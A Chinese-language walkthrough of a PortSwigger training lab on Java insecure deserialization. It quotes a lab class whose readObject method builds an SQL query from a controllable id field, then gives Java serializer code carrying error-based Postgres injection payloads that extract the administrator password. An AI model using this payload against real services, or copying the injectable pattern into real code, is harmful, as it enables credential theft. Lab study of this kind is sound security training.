# 实验：为 Java 反序列化开发自定义 Gadget Chain

https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization

本实验使用基于序列化的会话机制。如果你能构建一个合适的 gadget chain（小工具链），你就可以利用此实验的不安全反序列化漏洞来获取管理员密码。

为了解决本实验，请获取源代码访问权限，并利用它构建一个 gadget chain 以获取管理员密码。然后，以 `administrator` 身份登录并删除 `carlos`。

你可以使用以下凭据登录自己的账户：`wiener:peter`

请注意，解决此实验需要基本熟悉我们在 Web Security Academy 上涵盖的另一个主题。

> **提示**
> 为了节省你的一些精力，我们提供了一个用于序列化对象的[通用 Java 程序](https://github.com/PortSwigger/serialization-examples/tree/master/java/generic)。你可以改编此程序来生成适合你利用程序的合适对象。如果你还没有设置 Java 环境，你可以使用基于浏览器的 IDE（例如 repl.it）来编译和执行该程序。

        ```java
        package data.productcatalog;

        import common.db.JdbcConnectionBuilder;

        import java.io.IOException;
        import java.io.ObjectInputStream;
        import java.io.Serializable;
        import java.sql.Connection;
        import java.sql.ResultSet;
        import java.sql.SQLException;
        import java.sql.Statement;

        public class ProductTemplate implements Serializable
        {
            static final long serialVersionUID = 1L;

            private final String id;
            private transient Product product;

            public ProductTemplate(String id)
            {
                this.id = id;
            }

            // 自动反序列化方法
            private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
            {
                inputStream.defaultReadObject();

                // 数据库
                JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                        "org.postgresql.Driver",
                        "postgresql",
                        "localhost",
                        5432,
                        "postgres",
                        "postgres",
                        "password"
                ).withAutoCommit();

                try
                {
                    Connection connect = connectionBuilder.connect(30);
                    // 属性 id 可被控制
                    String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
                    Statement statement = connect.createStatement();
                    ResultSet resultSet = statement.executeQuery(sql);
                    if (!resultSet.next())
                    {
                        return;
                    }
                    product = Product.from(resultSet);
                }
                catch (SQLException e)
                {
                    throw new IOException(e);
                }
            }

            public String getId()
            {
                return id;
            }

            public Product getProduct()
            {
                return product;
            }
        }
        ```
        - 存在序列化接口，存在自动调用的 `readObject` 方法
        - 数据库为 postgres

载荷序列
- `ProductTemplate` 类拥有自动反序列化方法 `readObject`
    - 其中属性 `id` 被拼接到 SQL 上下文中
        ```sql
        SELECT * FROM products WHERE id = '$id' LIMIT 1
        ```
        - 查询函数似乎仅可进行单条查询，于是无法使用需在顶层的 postgres 带外语句

构造载荷
- 尝试普通的 SQLi 
    ```java
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.Serializable;
    import java.io.IOException;

    public class ProductTemplate implements Serializable{
        private final String id = "1' ORDER BY 1 LIMIT 1--";
    }

    public class SerializeTest{
        public static void main(String args[]) throws Exception{
            ProductTemplate obj_pt = new ProductTemplate();
            FileOutputStream fos = new FileOutputStream("java_object.ser");
            ObjectOutputStream os = new ObjectOutputStream(fos);
            os.writeObject(obj_pt);
            os.close();
    ```

```java
package data.productcatalog;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.Serializable;
import java.io.IOException;

public class ProductTemplate implements Serializable{
    static final long serialVersionUID = 1L;
    private final String id = "1' AND 1=(SELECT CAST((SELECT password FROM users WHERE username='administrator') AS int))--";
}

public class SerializeTest{
    public static void main(String args[]) throws Exception{
        ProductTemplate obj_pt = new ProductTemplate();
        FileOutputStream fos = new FileOutputStream("java_object.ser");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(obj_pt);
        os.close();
    }
}
```
- 注，路径为 `./data/productcatalog/当前脚本`
